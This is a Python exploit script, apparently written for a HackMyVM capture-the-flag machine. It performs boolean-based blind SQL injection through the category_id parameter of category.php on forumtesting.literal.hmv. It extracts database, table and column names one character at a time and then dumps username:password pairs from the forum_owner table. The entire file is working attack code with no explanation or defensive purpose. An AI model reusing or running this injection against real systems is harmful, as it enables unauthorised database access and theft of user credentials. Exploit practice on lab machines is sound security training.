#!/usr/bin/python3

import requests
import signal
import string
import re

# Variables

URL = "http://forumtesting.literal.hmv"
dictionary = string.ascii_letters + string.digits + string.punctuation + "£"

# Funciones

def exit2calle(sig, frame):  # controlamos salida forzada con Ctrl^C
    print("\nInterrupción, saliendo...\n")
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

def send_query(malicious_query, letter):
    end = False

    base_query = f"1 AND {malicious_query}-- -"
    data_get = {"category_id": base_query}

    r = requests.get(URL + '/category.php', params=data_get)
    if "New things for the blog" in r.text:
        end = True
        return end

def extract_databases():
    print("(+) ---------------------------------------------- Extracting databases")
    for row in range(0,100):
        result = ""
        for position in range(1,100):
            for letter in dictionary:
                if letter == "£":
                    break

                malicious_query = f"ASCII(SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT {row},1),{position},1))={ord(letter)}"
                end = send_query(malicious_query, letter)

                if end:
                    result += letter
                    break

            if letter == "£":
                print(result)
                break

        if position == 1:
            break

def extract_tables():
    print("(+) ---------------------------------------------- Extracting tables from forumtesting")
    for row in range(0,100):
        result = ""
        for position in range(1,100):
            for letter in dictionary:
                if letter == "£":
                    break

                malicious_query = f"ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='forumtesting' LIMIT {row},1),{position},1))={ord(letter)}"
                end = send_query(malicious_query, letter)

                if end:
                    result += letter
                    break

            if letter == "£":
                print(result)
                break

        if position == 1:
            break

def extract_columns():
    print("(+) ---------------------------------------------- Extracting columns from forumtesting.forum_owner")
    for row in range(0,100):
        result = ""
        for position in range(1,100):
            for letter in dictionary:
                if letter == "£":
                    break

                malicious_query = f"ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema='forumtesting' and table_name='forum_owner' LIMIT {row},1),{position},1))={ord(letter)}"
                end = send_query(malicious_query, letter)

                if end:
                    result += letter
                    break

            if letter == "£":
                print(result)
                break

        if position == 1:
            break

def extract_information():
    print("(+) ---------------------------------------------- Extracting user data from forumtesting.forum_owner")
    for row in range(0,100):
        result = ""
        for position in range(1,300):
            for letter in dictionary:
                if letter == "£":
                    break

                malicious_query = f"ASCII(SUBSTR((SELECT CONCAT(username,':',password) FROM forumtesting.forum_owner LIMIT {row},1),{position},1))={ord(letter)}"
                end = send_query(malicious_query, letter)

                if end:
                    result += letter
                    break

            if letter == "£":
                print(result)
                break

        if position == 1:
            break

def main():
    extract_databases()
    extract_tables()
    extract_columns()
    extract_information()

# Inicio programa

if '__main__' == __name__:
    print("\n(+ SQL Injection Boolean-Based in forumtesting.literal.hmv +)\n")
    main()
